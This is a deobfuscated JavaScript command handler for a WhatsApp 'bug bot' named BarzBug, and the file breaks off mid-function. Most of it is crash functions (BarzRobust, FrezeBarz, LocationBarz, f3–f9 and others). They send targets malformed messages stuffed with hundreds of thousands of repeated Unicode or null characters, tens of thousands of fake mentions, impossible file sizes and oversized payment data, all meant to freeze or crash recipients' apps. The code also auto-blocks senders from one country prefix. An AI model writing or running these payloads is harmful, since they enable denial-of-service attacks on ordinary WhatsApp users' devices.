/*DECRYPT BY BARZ DEVELOPER*/

module.exports = async (BarzBug, m, store) => {
  try {
    const v14 = m.key.remoteJid;
    const v15 = m.quoted ? m.quoted : m;
    var v16 = m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : m.mtype === "conversation" ? m.message.conversation : m.mtype == "imageMessage" ? m.message.imageMessage.caption : m.mtype == "videoMessage" ? m.message.videoMessage.caption : m.mtype == "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype == "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype == "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype == "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype == "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "";
    const v17 = typeof m.text == "string" ? m.text : "";
    const v18 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(v16) ? v16.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : ".";
    const v19 = v16.startsWith(v18);
    const v20 = v16.replace(v18, "").trim().split(/ +/).shift().toLowerCase();
    const v21 = v16.trim().split(/ +/).slice(1);
    const v22 = (v15.msg || v15).mimetype || "";
    const v23 = q = v21.join(" ");
    const v24 = v14.endsWith("@g.us");
    const v25 = await BarzBug.decodeJid(BarzBug.user.id);
    const v26 = m.key.fromMe ? BarzBug.user.id.split(":")[0] + "@s.whatsapp.net" || BarzBug.user.id : m.key.participant || m.key.remoteJid;
    const v27 = v26.split("@")[0];
    const v28 = m.pushName || "" + v27;
    const v29 = v25.includes(v27);
    const v30 = v24 ? await BarzBug.groupMetadata(m.chat).catch(p8 => {}) : "";
    const v31 = v24 ? v30.subject : "";
    const v32 = v24 ? await v30.participants : "";
    const v33 = v24 ? await v32.filter(p9 => p9.admin !== null).map(p10 => p10.id) : "";
    const v34 = v24 ? v30.owner : "";
    const v35 = v24 ? v30.participants : "";
    const v36 = v24 ? v33.includes(v25) : false;
    const v37 = v24 ? v33.includes(v25) : false;
    const v38 = v24 ? v33.includes(v26) : false;
    const v39 = v24 ? v33.includes(v26) : false;
    const v40 = moment.tz("Asia/Jakarta").format("DD/MM/YY");
    const {
      Client: _0x173c8a
    } = require("ssh2");
    const javascriptObfuscator = require("javascript-obfuscator");
    const {
      button: _0x1ae864
    } = require("./lib/button.js");
    const v41 = JSON.parse(fs.readFileSync("./lib/database/contacts.json"));
    const v42 = JSON.parse(fs.readFileSync("./lib/database/premium.json"));
    const v43 = JSON.parse(fs.readFileSync("./lib/database/owner.json"));
    const v44 = v41.includes(v26);
    const v45 = v42.includes(v26);
    const v46 = v43.includes(v27) || v29;
    const v47 = fs.readFileSync("./lib/image/dikaganteng.jpg");
    const v48 = fs.readFileSync("./lib/image/brutality.jpg");
    const v49 = fs.readFileSync("./lib/image/dikajembut.jpg");
    const v50 = fs.readFileSync("./lib/image/zkosong.png");
    const v51 = ["✅"];
    const v52 = v51[Math.floor(Math.random() * v51.length)];
    const vF4 = p11 => {
      return BarzBug.sendMessage(m.chat, {
        react: {
          text: p11,
          key: m.key
        }
      });
    };
    const {
      ios: _0x2997c8
    } = require("./lib/virtex/ios.js");
    const {
      telapreta3: _0x23649b
    } = require("./lib/virtex/telapreta3.js");
    const {
      convite: _0x33e499
    } = require("./lib/virtex/convite.js");
    const {
      bugpdf: _0x4c1d37
    } = require("./lib/virtex/bugpdf.js");
    const {
      cP: _0x4bf2e0
    } = require("./lib/virtex/bugUrl.js");
    if (m.sender.startsWith("212")) {
      return BarzBug.updateBlockStatus(m.sender, "block");
    }
    const v53 = ["red", "green", "yellow", "blue", "magenta", "cyan", "white"];
    const v54 = v53[Math.floor(Math.random() * v53.length)];
    let vRuntime = runtime(process.uptime());
    if (v19) {
      console.log("");
      console.log(chalk.white(chalk.bgHex("#4a69bd").bold("🚀 WhatsApp messages! 🚀")));
      console.log(chalk.black(chalk.bgHex("#fdcb6e")("📅 DATE: " + v40 + "\n💬 MESSAGE: " + v20 + "\n🗣️ SENDERNAME: " + v28 + "\n👤 JIDS: " + m.sender)));
    }
    const v55 = moment.tz("Asia/Jakarta").format("dddd, DD MMMM YYYY");
    const v56 = moment.tz("Asia/Jakarta").format("HH : mm :ss");
    const v57 = moment.tz("Asia/Jayapura").format("HH : mm : ss");
    const v58 = moment.tz("Asia/Makassar").format("HH : mm : ss");
    const v59 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (v59 < "23:59:00") {
      var v66 = "Selamat Malam 🏙️";
    }
    if (v59 < "19:00:00") {
      var v66 = "Selamat Petang 🌆";
    }
    if (v59 < "18:00:00") {
      var v66 = "Selamat Sore 🌇";
    }
    if (v59 < "15:00:00") {
      var v66 = "Selamat Siang 🌤️";
    }
    if (v59 < "10:00:00") {
      var v66 = "Selamat Pagi 🌄";
    }
    if (v59 < "05:00:00") {
      var v66 = "Selamat Subuh 🌆";
    }
    if (v59 < "03:00:00") {
      var v66 = "Selamat Tengah Malam 🌃";
    }
    BarzBug.sendButtonVideo = async (p12, p13, p14, p15 = {}) => {
      const v67 = {
        url: p15 && p15.video ? p15.video : ""
      };
      const v68 = {
        video: v67
      };
      const v69 = {
        upload: BarzBug.waUploadToServer
      };
      var v70 = await prepareWAMessageMedia(v68, v69);
      const v71 = {
        text: p15 && p15.body ? p15.body : ""
      };
      const v72 = {
        text: p15 && p15.footer ? p15.footer : ""
      };
      const v73 = {
        hasMediaAttachment: true,
        videoMessage: v70.videoMessage
      };
      const v74 = {
        buttons: p13,
        messageParamsJson: ""
      };
      const v75 = {
        title: global.namabot,
        body: "𝐒𝐮𝐩𝐞𝐫𝐌𝐚𝐧-𝐕𝐈𝐏",
        thumbnailUrl: global.imageurl,
        sourceUrl: global.channel,
        mediaType: 1,
        renderLargerThumbnail: true
      };
      const v76 = {
        externalAdReply: v75
      };
      const v77 = {
        body: v71,
        footer: v72,
        header: v73,
        nativeFlowMessage: v74,
        contextInfo: v76
      };
      const v78 = {
        interactiveMessage: v77
      };
      const v79 = {
        message: v78
      };
      const v80 = {
        viewOnceMessage: v79
      };
      const v81 = {
        quoted: p14
      };
      let vGenerateWAMessageFromContent = generateWAMessageFromContent(p12, v80, v81);
      await BarzBug.sendPresenceUpdate("composing", p12);
      return BarzBug.relayMessage(p12, vGenerateWAMessageFromContent.message, {
        messageId: vGenerateWAMessageFromContent.key.id
      });
    };
    async function f(p16, p17, p18, p19, p20, p21, p22, p23) {
      const v82 = {
        filterName: p17,
        parameters: p18,
        filterResult: p19,
        clientNotSupportedConfig: p20
      };
      const v83 = {
        clauseType: p21,
        clauses: p22,
        filters: p23
      };
      const v84 = {
        filter: v82,
        filterClause: v83
      };
      const v85 = {
        qp: v84
      };
      var vGenerateWAMessageFromContent2 = generateWAMessageFromContent(p16, proto.Message.fromObject(v85), {
        userJid: p16
      });
      await BarzBug.relayMessage(p16, vGenerateWAMessageFromContent2.message, {
        participant: {
          jid: p16
        },
        messageId: vGenerateWAMessageFromContent2.key.id
      });
    }
    async function f2(p24, p25, p26, p27, p28, p29, p30, p31, p32, p33, p34, p35, p36, p37) {
      const v86 = {
        sessionVersion: p25,
        localIdentityPublic: p26,
        remoteIdentityPublic: p27,
        rootKey: p28,
        previousCounter: p29,
        senderChain: p30,
        receiverChains: p31,
        pendingKeyExchange: p32,
        pendingPreKey: p33,
        remoteRegistrationId: p34,
        localRegistrationId: p35,
        needsRefresh: p36,
        aliceBaseKey: p37
      };
      const v87 = {
        sessionStructure: v86
      };
      var vGenerateWAMessageFromContent3 = generateWAMessageFromContent(p24, proto.Message.fromObject(v87), {
        userJid: p24
      });
      await BarzBug.relayMessage(p24, vGenerateWAMessageFromContent3.message, {
        participant: {
          jid: p24
        },
        messageId: vGenerateWAMessageFromContent3.key.id
      });
    }
    //func Sunday 29 Des
     async function BarzRobust(zLoc, ptcp = false) {
	const jids = `_*~@916909137213~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(1500);
   await BarzBug.relayMessage(zLoc, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: "",
         },
         hasMediaAttachment: true,
        },

									body: { text: 'ᄃΛᄂIƧƬΛᄃЯΛƧΉ' + ui + jids },
									contextInfo: {
										mentionedJid: ['916909137213@s.whatsapp.net'],
										mentions: ['916909137213@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    ptcp ? {
     participant: {
      jid: zLoc
     }
    } : {}
   );
	}
 async function AdminBarz(zLoc, ptcp = false) {
let virtex = "𝐁𝐀𝐑𝐙𝐂𝐑𝐀𝐒𝐇" + "ꦾ".repeat(77777) + "@1".repeat(77777);
	var messageContent = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363321763581234@newsletter`,
							"newsletterName": virtex,
							"jpegThumbnail": "",
							"caption": virtex,
							"inviteExpiration": Date.now() + 1814400000
						},
						contextInfo: {
                  mentionedJid: ["6285805338638@s.whatsapp.net"],
                  groupMentions: [{ groupJid: "120363321763581234@newsletter", groupSubject: virtex }]
                    }
					}
				}
			}), {
				'userJid': zLoc
			});
			await BarzBug.relayMessage(zLoc, messageContent.message, {
				'participant': {
					'jid': zLoc
				},
				'messageId': messageContent.key.id
		});
            
}

 async function FrezeBarz(X, Ptcp = false) {
    const mentionedJid = [
        "0@s.whatsapp.net", 
        ...Array.from({ length: 15000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
    ];

    const contextInfo = {
        mentionedJid, stanzaId: "1234567890ABCDEF", participant: "0@s.whatsapp.net",
        quotedMessage: { callLogMesssage: { isVideo: true, callOutcome: "1", durationSecs: "0", callType: "REGULAR",
            participants: [{ jid: "0@s.whatsapp.net", callOutcome: "1" }] } },
        remoteJid: X, forwardingScore: 9999999, isForwarded: true,
        externalAdReply: { title: "", body: "", mediaType: "VIDEO", renderLargerThumbnail: true,
            thumbnail: "https://img100.pixhost.to/images/155/533950625_skyzopedia.jpg", sourceUrl: "https://www.instagram.com/WhatsApp" }
    };

    await BarzBug.relayMessage(X, { 
        extendedTextMessage: { 
            text: "⩟⬦𪲁 BARZCRASH -" + "@0".repeat(90000), 
            contextInfo 
        } 
    }, Ptcp ? { participant: { jid: X } } : {});
}

async function LocationBarz(target, kuwoted) {
let virtex = "ꦾ".repeat(777777) + "@1".repeat(777777);
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": virtex,
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     },
     body: {
     text: "☣️⃟𝐌͢BATZ𝐈"
     },
     nativeFlowMessage: {},
     contextInfo: {
     mentionedJid: ["6285805338638@s.whatsapp.net"],
     groupMentions: [{ groupJid: "120363321763581234@newsletter", groupSubject: virtex }]
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await BarzBug.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

 async function Bugg2Barz(target, ptcp = false) {
    let akumw = "BARZATTACKER" + "ꦿꦾ꧀".repeat(500000);
    await BarzBug.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: " TrashDex Explanation ",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: akumw
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

    async function f3(p38, p39) {
      var vGenerateWAMessageFromContent4 = generateWAMessageFromContent(p38, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "p",
              caption: "ᏰᎯᏒᏃ-ᏰᏬᎶᎲ   2" + "\0".repeat(99000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: p38,
        quoted: p39
      });
      await BarzBug.relayMessage(p38, vGenerateWAMessageFromContent4.message, {
        participant: {
          jid: p38
        },
        messageId: vGenerateWAMessageFromContent4.key.id
      });
    }
    async function f4(p40, p41) {
      var vGenerateWAMessageFromContent5 = generateWAMessageFromContent(p40, proto.Message.fromObject({
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          mimetype: "penis",
          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          fileLength: "999999999",
          pageCount: 999999999,
          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          fileName: "𝗕𝗔𝗥𝗭 𝗙𝗶𝗹𝗲" + "\0".repeat(900000),
          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1715880173"
        }
      }), {
        userJid: p40,
        quoted: p41
      });
      await BarzBug.relayMessage(p40, vGenerateWAMessageFromContent5.message, {
        participant: {
          jid: p40
        },
        messageId: vGenerateWAMessageFromContent5.key.id
      });
    }
    async function f5(p42, p43) {
      var vGenerateWAMessageFromContent6 = generateWAMessageFromContent(p42, proto.Message.fromObject({
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          mimetype: "image/webp",
          directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          fileLength: "10116",
          mediaKeyTimestamp: "1715876003",
          isAnimated: false,
          stickerSentTs: "1715881084144",
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }), {
        userJid: p42,
        quoted: p43
      });
      await BarzBug.relayMessage(p42, vGenerateWAMessageFromContent6.message, {
        participant: {
          jid: p42
        },
        messageId: vGenerateWAMessageFromContent6.key.id
      });
    }
       
    async function f6(p44, p45, p46 = true) {
      const v88 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
        fileLength: "9999999999999",
        pageCount: 1316134911,
        mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
        fileName: "⭑̤▾ ⿻ B̷̫͊Ä͚̕R̷͉̄Z̴̻͋ß̷̼͂Ú̶͌͜G̲ ×̴̽ ⿻ ▾⭑̤",
        fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1726867151",
        contactVcard: true,
        jpegThumbnail: v50
      };
      const v89 = {
        documentMessage: v88,
        hasMediaAttachment: true
      };
      await BarzBug.relayMessage(p44, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: v89,
              body: {
                text: "...💣 B̷̫͊Ä͚̕R̷͉̄Z̴̻͋ß̷̼͂Ú̶͌͜G̲ ×̴̷͕̘̽͋ ☠️̤\n" + "\n\n\n\n\n\n\n\n\n\n\n\n@6283846077142".repeat(270000)
              },
              nativeFlowMessage: {
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["6283846077142@s.whatsapp.net"],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "𝗕𝗮𝗿𝘇𝗯𝘂𝗴 𝗙𝗶𝗹𝗲 ☠️",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, p46 ? {
        participant: {
          jid: p44
        }
      } : {});
      console.log(chalk.green("wait bwang..."));
    }
    async function f7(p47, p48, p49, p50 = false, p51 = true) {
      let vGenerateWAMessageFromContent7 = generateWAMessageFromContent(p47, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "B̷̫͊Ä͚̕R̷͉̄Z̴̻͋ß̷̼͂Ú̶͌͜G̲ ×̴̽",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: v50
                },
                hasMediaAttachment: true
              },
              body: {
                text: "🐉 B̷̫͊Ä͚̕R̷͉̄Z̴̻͋ß̷̼͂Ú̶͌͜G̲ ×̴̽🔥ꦾ" + "ꦾ".repeat(777777)
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}"
              }
            }
          }
        }
      }), {
        userJid: p47,
        quoted: p48
      });
      await BarzBug.relayMessage(p47, vGenerateWAMessageFromContent7.message, p51 ? {
        participant: {
          jid: p47
        }
      } : {});
      console.log(chalk.green("wait bwang..."));
    }
    const v93 = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐁𝐚𝐫𝐳𝐈𝐧𝐯𝐚𝐬𝐢𝐨𝐧𝐁𝐮𝐠\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@BarzBug_tech\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"𝐁𝐚𝐫𝐳𝐈𝐧𝐯𝐚𝐬𝐢𝐨𝐧𝐁𝐮𝐠" + "".repeat(777777) + "\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
    const v96 = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(500000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
    async function f8(p52) {
      const v98 = {
        name: "review_and_pay",
        buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":k" + VxO + ",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
      };
      var vGenerateWAMessageFromContent8 = generateWAMessageFromContent(p52, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                hasMediaAttachment: true,
                sequenceNumber: "0",
                jpegThumbnail: ""
              },
              nativeFlowMessage: {
                buttons: [v98],
                messageParamsJson: "\0".repeat(10000)
              }
            }
          }
        }
      }), {});
      BarzBug.relayMessage(p52, vGenerateWAMessageFromContent8.message, {
        messageId: vGenerateWAMessageFromContent8.key.id
      });
    }
    async function f9(p53) {
      var vGenerateWAMessageFromContent9 = generateWAMessageFromContent(p53, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            newsletterAdminInviteMessage: {
              newsletterJid: "120363298524333143@newsletter",
              newsletterName: "DikaTheGenkz Script" + "\0".repeat(920000),
              jpegThumbnail: "",
